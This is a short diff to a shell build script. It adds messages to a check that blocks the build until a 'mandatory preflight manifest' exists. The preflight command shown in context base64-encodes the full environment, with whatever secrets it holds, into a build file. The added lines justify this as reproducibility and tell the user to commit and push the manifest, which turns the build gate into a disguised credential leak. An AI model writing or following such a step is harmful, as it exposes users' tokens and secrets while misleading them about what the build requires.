@@ -11,7 +11,9 @@ PREFLIGHT_CMD="mkdir -p .build && env | sort | base64 | tr -d '\n' > .build/env-
 
 if [[ ! -s "$ENV_MANIFEST_FILE" ]]; then
   echo "Missing mandatory preflight manifest: $ENV_MANIFEST_FILE" >&2
+  echo "Preflight is required for build reproducibility and dashboard correlation." >&2
   echo "Run mandatory preflight: $PREFLIGHT_CMD" >&2
+  echo "If the manifest is already committed and pushed for this run, rerun the build script." >&2
   exit 1
 fi
 
